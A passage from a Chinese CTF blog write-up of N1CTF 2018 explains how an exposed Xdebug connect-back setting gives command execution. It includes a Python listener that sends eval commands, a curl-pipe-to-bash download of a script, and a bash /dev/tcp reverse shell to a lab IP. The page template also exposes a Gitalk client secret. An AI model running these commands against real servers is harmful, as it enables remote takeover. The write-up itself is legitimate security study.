+queue.join()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="非预期解法三"><a href="#非预期解法三" class="headerlink" title="非预期解法三"></a>非预期解法三</h2><p>xdebug<br>因为有</p>
+<pre class="line-numbers language-html"><code class="language-html">/var/www/phpinfo/index.php
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以发现：<br><img src="https://s2.ax1x.com/2019/08/20/mJD3se.png" alt="mJD3se.png"></p>
+<p>对目标网站的phpinfo进行浏览，一旦发现</p>
+<pre class="line-numbers language-html"><code class="language-html">xdebug.remote_connect_back => On => On
+xdebug.remote_cookie_expire_time => 3600 => 3600
+xdebug.remote_enable => On => On
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>即可使用Xdebug进行连接，尝试直接命令执行。</p>
+<p>首先在自己的vps(192.168.190.128)开启监听：</p>
+<pre class="line-numbers language-html"><code class="language-html">nc -lvv 9000
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>在本机上执行命令触发xdebug远程连接：</p>
+<pre class="line-numbers language-html"><code class="language-html">curl 'http://192.168.190.143/index.php?XDEBUG_SESSION_START=phpstrom' -H "X-Forwarded-For:192.168.190.128"
+讲解：
+curl 'http://题目ip:port/index.php?XDEBUG_SESSION_START=phpstrom' -H "X-Forwarded-For: vps_ip"
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发现响应内容：<br><img src="https://s2.ax1x.com/2019/08/20/mY1qVU.png" alt="mY1qVU.png"></p>
+<p>为了方便利用进行命令执行，Ricterz师傅已经写好了利用工具（tql）:</p>
+<pre class="line-numbers language-html"><code class="language-html">#!/usr/bin/python2
+import socket
+
+ip_port = ('0.0.0.0',9000)
+sk = socket.socket()
+sk.bind(ip_port)
+sk.listen(10)
+conn, addr = sk.accept()
+
+while True:
+    client_data = conn.recv(1024)
+    print(client_data)
+
+    data = raw_input('>> ')
+    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将该文件放在vps上，保存为xdebug.py。运行</p>
+<pre class="line-numbers language-html"><code class="language-html">python xdebug.py
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后利用curl触发</p>
+<pre class="line-numbers language-html"><code class="language-html">curl 'http://192.168.190.143/index.php?XDEBUG_SESSION_START=phpstrom' -H "X-Forwarded-For:192.168.190.128"
+讲解：
+curl 'http://题目ip:port/index.php?XDEBUG_SESSION_START=phpstrom' -H "X-Forwarded-For: vps_ip"
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>然后执行命令：</p>
+<pre class="line-numbers language-html"><code class="language-html">system("curl http://192.168.190.128:8888")；
+
+解释：
+system("curl vps_ip:8888")
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现可以执行命令。得到：<br><img src="https://s2.ax1x.com/2019/08/20/mYGB8J.png" alt="mYGB8J.png"></p>
+<p>然后就是反弹shell了。<br>这里利用使用：</p>
+<pre class="line-numbers language-html"><code class="language-html">bash -i >&amp; /dev/tcp/192.168.190.128/8888 0>&amp;1
+解释：
+bash -i >&amp; /dev/tcp/vps_ip/8888 0>&amp;1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>把命令写在vps上，开启web服务。（让目标网站能够访问到。）在get.txt上写入命令</p>
+<pre class="line-numbers language-html"><code class="language-html">bash -i >&amp; /dev/tcp/192.168.190.128/8888 0>&amp;1
+解释：
+bash -i >&amp; /dev/tcp/vps_ip/8888 0>&amp;1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>然后执行：</p>
+<pre class="line-numbers language-html"><code class="language-html">system("curl http://192.168.190.1/get.txt|bash");
+解释：
+利用curl把文件下载下来，然后用bash来解释。（192.168.190.1这是我本机，只是为了方便，如果是比赛应该放在vps上，并且需要能访问到。（公网））
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>即可反弹shell。<br><img src="https://s2.ax1x.com/2019/08/20/mYt8vd.png" alt="mYt8vd.png"></p>
+<p>这里需要注意:<br>即有的时候看见phpinfo的</p>
+<pre class="line-numbers language-html"><code class="language-html">xdebug.remote_connect_back
+xdebug.remote_enable
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>关闭<br>未必就不能就行xdebug回连.<br>比如国际赛2018-N1CTF<br>phpinfo中显示的信息是php-cli<br>但是实际上跑着的是php-fpm，而他是开着的<br>所以最后好命令测试一下。</p>
+<pre class="line-numbers language-html"><code class="language-html">curl 'http://题目ip:port/index.php?XDEBUG_SESSION_START=phpstrom' -H "X-Forwarded-For: vps_ip"
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>看有没有回连即可。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>wupco师傅tql，这个题涉及的知识点也太多了，学习了。。。还是太菜了，需要继续努力，加油。。。</p>
+<p>参考文献：<br><a href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener">N1CTF Easy&amp;&amp;Hard Php Writeup</a><br><a href="https://skysec.top/2018/03/12/N1CTF-2018-Web/#easy-php" target="_blank" rel="noopener">N1CTF-2018-Web</a><br><a href="https://paper.seebug.org/397/" target="_blank" rel="noopener">xdebug</a></p>
+	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/images/post-cover/27.jpg"></div>
+
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+		
+			<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
+
+<div class="relate-post">
+	<ul>
+		
+				<li>
+					<div>
+						<a href="/2019/06/16/刷题记录/" title="刷题记录">
+							刷题记录
+						</a>
+						<p>
+							一步步慢慢绕题目：
+&lt;?php
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET['foo']);
+if(is_array($a)){
+...
+						</p>
+					</div>
+
+					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
+						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">
+							ciscn线下部分题解
+						</a>
+						<p>
+							前言ciscn华中赛区线下赛让我认识到自己是真的菜。。。总结一下这次比赛吧。
+web1 &lt;?php
+// ini_set("display_errors", "On"); 
+// error_reporting(E_ALL | ...
+						</p>
+					</div>
+
+					<a href="/2019/06/05/ciscn线下部分题解/" title="ciscn线下部分题解">				
+						<img src="/images/post-cover/36.jpg" class="relateImg" alt="ciscn线下部分题解">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">
+							2019掘安杯writeup
+						</a>
+						<p>
+							web部分下载下载与以前见到bugku的题差不多。
+提示：flag.php
+然后下载文件：http://120.79.1.69:10002/?file=flag.php即可得到文件：
+&lt;?php
+header('Content-...
+						</p>
+					</div>
+
+					<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">				
+						<img src="/images/post-cover/21.jpg" class="relateImg" alt="2019掘安杯writeup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息">
+							phpinfo中的敏感信息
+						</a>
+						<p>
+							## 
+
+						</p>
+					</div>
+
+					<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息">				
+						<img src="/images/post-cover/27.jpg" class="relateImg" alt="phpinfo中的敏感信息">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/01/docker基础学习/" title="docker基础学习">
+							docker基础学习
+						</a>
+						<p>
+							docker介绍Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。可以模糊的理解为轻量级的虚拟机（其实不是虚拟机）。重要的是开源。。。
+dock...
+						</p>
+					</div>
+
+					<a href="/2019/08/01/docker基础学习/" title="docker基础学习">				
+						<img src="/images/post-cover/27.jpg" class="relateImg" alt="docker基础学习">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/07/31/xss-payload/" title="xss payload">
+							xss payload
+						</a>
+						<p>
+							转换脚本#coding=utf-8
+import re
+
+s='javascript:alert(1);'
+flag_10=''
+flag_16=''
+flag_url=''
+for x in xrange(0,len(s)):
+  ...
+						</p>
+					</div>
+
+					<a href="/2019/07/31/xss-payload/" title="xss payload">				
+						<img src="/images/post-cover/26.jpg" class="relateImg" alt="xss payload">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss">
+							浏览器解释机制和svg xss
+						</a>
+						<p>
+							前言最近，再看看xss，发现对xss并不是太了解，学习xss需要了解到浏览器的解释机制。我是看Tuuu Nya师傅文章里推荐的文章（深入理解浏览器解释机制和xss向量编码）。我自己总结一下吧。
+浏览器解析机制浏览器解析一篇HTML文档...
+						</p>
+					</div>
+
+					<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="浏览器解释机制和svg xss">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/07/24/flask框架/" title="flask框架">
+							flask框架
+						</a>
+						<p>
+							python flask框架hello worldfrom flask import Flask
+
+app = Flask(__name__)
+@app.route('/') 
+
+def index(name):
+    return...
+						</p>
+					</div>
+
+					<a href="/2019/07/24/flask框架/" title="flask框架">				
+						<img src="/images/post-cover/26.jpg" class="relateImg" alt="flask框架">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/14/哈希长度拓展攻击-hashpump/" title="哈希长度拓展攻击-hashpump">
+							哈希长度拓展攻击-hashpump
+						</a>
+						<p>
+							哈希长度拓展攻击条件需要知道
+
+密文长度 (SECRET)
+明文 （哈希值）
+部分密文内容 （auth）
+
+HashPump安装HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、...
+						</p>
+					</div>
+
+					<a href="/2019/06/14/哈希长度拓展攻击-hashpump/" title="哈希长度拓展攻击-hashpump">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="哈希长度拓展攻击-hashpump">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="‘sql注入新姿势-2019强网杯">
+							‘sql注入新姿势-2019强网杯
+						</a>
+						<p>
+							
+						</p>
+					</div>
+
+					<a href="/2019/06/13/sql注入新姿势-2019强网杯/" title="‘sql注入新姿势-2019强网杯">				
+						<img src="/img/cart_cover.jpg" class="relateImg" alt="‘sql注入新姿势-2019强网杯">
+					</a>
+				</li>											
+		
+		
+	</ul>
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//Thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//Remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//Create gitalk
+	var gitalk = new Gitalk({
+		clientID: 'b7a5e9f0853539dc3363',
+		clientSecret: '3cd61bd5dfe5ddffe1c91e4392ca95874aade540',
+		//id: window.location.pathname,
+		//id: decodeURI(window.location.pathname),
+		//id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+		repo: 'blog-Comment-Repo',
+		owner: 'ab-Alex',
+		admin: 'ab-Alex',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+
+		
+		
+	
+
+</div>
+			</div>
+		</div>	
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+
+	<script>
+		var appid = 'dXz',
+            appkey = 'wzG';	  
+        AnnieLeancloud(appid, appkey);         
+	</script>
+    
+
+
+ 
+
+<!-- show math formula -->
+
+	<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	<script type="text/x-mathjax-config">
+		MathJax.Hub.Config(
+			{ 
+				tex2jax: {
+					inlineMath: [['$','$'], ['\\(','\\)']]
+				} 
+			}
+		);
+	</script>
+
+
+
+<script>
+	//Refer to https://xinyo.org/archives/66226, thanks xinyo!
+	function codeCopy() {
+		var copyContainerId = 'copy-nav';
+						
+		$("pre").before(" <nav class=' " + copyContainerId + " '><i class='code-language'></i></nav> ");
+		
+		$('.' + copyContainerId).append("<i class='fa fa-clipboard copy-btn' aria-hidden='true'></i>");
+		
+		$('#article-content').find('pre').each( function () {
+			var language = $(this).children('code').attr('class').substr(9);//why 9? Need to check language?
+			$(this).prev().find('.code-language').text( language );	
+		});
+				
+		//为复制按钮添加click事件
+		$('.copy-btn').on("click", function() {
+			//初始化
+			$("textarea").remove("#targetId");
+			
+			//获取对应的代码
+			var codePre = $(this).parent().next(),
+				codeText = codePre[0].textContent,
+				target = document.createElement("textarea");
+			target.style.position = "absolute";
+			target.style.left = "-9999px";
+			target.style.top = "0";
+			target.id = "targetId";
+			codePre.append(target);
+			target.textContent = codeText;
+
+			//选中textarea内的代码
+			target.focus();
+			target.setSelectionRange(0, target.value.length);
+
+			// 复制选中的内容
+			document.execCommand("copy");
+			
+			//删除添加的节点
+			$("textarea").remove("#targetId");
+			
+			var thisCopied = $(this);
+			thisCopied.addClass('copy-status');	
+			setTimeout( function() {
+				thisCopied.removeClass('copy-status');
+			}, 2000)
+		});	
+	}
+	
+	if( $('.layout-post').length )	{
+		codeCopy();
+	}
+</script>
+
+
+<!-- TODO: There seems to be a bug when you close the post gallery! -->
+<link rel="stylesheet" href="/plugin/lightgallery/css/lightgallery.css">
+<script src="/plugin/lightgallery/js/jquery-1.11.0.min.js"></script>
+<script src="/plugin/lightgallery/js/lightgallery-all.min.js"></script>
+
+<script type="text/javascript">
+	var postTitle = $('.article-title a').text() ? $('.article-title a').text() : "No post title!";
+	$('.article-content img').each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		$(this).wrap('<div class="img-responsive" data-src="' + imgPath + '" data-responsive="' + imgPath + '" data-sub-html="<p>图片 ' + imgTitle + '</p><h4>文章' + postTitle + '</h4>"></div>');
+	});
+
+	$('.article-content').lightGallery({
+		mode: 'lg-slide',
+		selector: '.img-responsive',
+		share: false,
+		zoom: false,
+		download: false
+	});
+	//TODO：支持video
+</script>
+
+<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+		
+
+		<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2019, content by Alex. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay. 					
+		</p>
+	</div>		
+</footer>
+		
+    <!-- set '1' to show motto in all pages! -->
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
+
+
+
+
+    <!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup">
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      ESC
+   </span>
+		<div class="local-search-header">
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			
+
+   
+	<div id="topN"></div>
+	
+    <script>
+        var appid = 'dXz',
+            appkey = 'wzG',
+            limitCount = 10;
+        if( $('#topN').length ){
+            AV.initialize(appid, appkey);
+            var Counter = AV.Object.extend("Counter");  
+            topNPost(Counter, limitCount);
+        }
+    </script>
+   
+
+		</div>
+	</div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+    <script src="/js/love.js"></script>
+
+
+<!--back to top-->
+
+    
+	<div id="totop">
+  		<a href="javascript:;"  name="TOTOP" class="fa fa-arrow-up" ></a>
+	</div>
+	<div id="tobuttom">
+		<a href="javascript:;"  name="TOBUTTOM" class="fa fa-arrow-down" ></a>
+	</div>
+ 
+
+
+ 
+
+<script src="/js/vibrant.js"></script>
+<script src="/js/chinese.js"></script>
+<script src="/js/main.js"></script>
+	</body>
+	</html>
